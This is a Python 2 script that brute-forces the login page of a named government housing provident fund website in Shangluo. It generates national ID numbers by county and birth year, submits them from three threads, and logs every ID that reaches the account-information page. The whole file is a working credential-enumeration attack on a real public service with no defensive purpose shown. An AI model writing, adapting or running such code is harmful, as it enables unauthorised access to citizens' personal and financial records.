# -*- coding: utf-8 -*-
import urllib
import urllib2
import cookielib
import logging
import threading
import Queue
import IDnumber
import time
#全局控制
G_ISRUN = True
#日志
logging.basicConfig(level=logging.WARNING,
                    filename='./log.txt',
                    filemode='w',
                    format='%(asctime)s: %(message)s')
#网页请求公共信息
#谷歌浏览器 ctr+shift+j 进入开发者模式 Network–>找到登陆请求的post数据–>Formdata
URL = 'http://gjj.shangluo.gov.cn/llxg/checkusr.asp'
InforURL = "http://gjj.shangluo.gov.cn/llxg/jbxxCx.asp"
USER_AGENT = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; ' \
             '.NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)'
HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Length': 64,
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': USER_AGENT
}

cj = cookielib.CookieJar() #设置cookie

def connted(data):
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    request = urllib2.Request(URL, data, HEADERS)
    result= opener.open(request)  # 登录页面
    return result.url

def issuccess(resulturl):
    if resulturl == "http://gjj.shangluo.gov.cn/llxg/jbxxCx.asp":
        return True
    print 'Fail!'
    return False

auths_queue = Queue.Queue(10) #全局任务队列

def srv():
    time.sleep(5)#防止队列为空，应该还可以改进
    thread = threading.current_thread()
    print "[*] 当前线程ID:",thread.getName()
    while G_ISRUN:
        data= auths_queue.get()
        if issuccess(connted(data)):
            logging.critical('Success-' + str(data))

#queue先进先出队列，函数放在队列中，启动三个线程来不断读取队列
#http://www.cnblogs.com/wangqiaomei/p/5682669.html
def run(p):
    pths=[]
    for i in range(3):
        pth= threading.Thread(target=srv)
        pth.start()
        pths.append(pth)

    for y in range(1955,1994):
        ids=IDnumber.ID_Yield()
        i = 0;
        Authdatas = ids.gen(place=p, year=y)
        for aid in Authdatas:
            auths_queue.put(aid)
    for pth in pths:
        pth.join()

def main():
    run(0)# 0~6 选择7个县
    while G_ISRUN:
        pass
    return
if __name__ == '__main__':
    main()
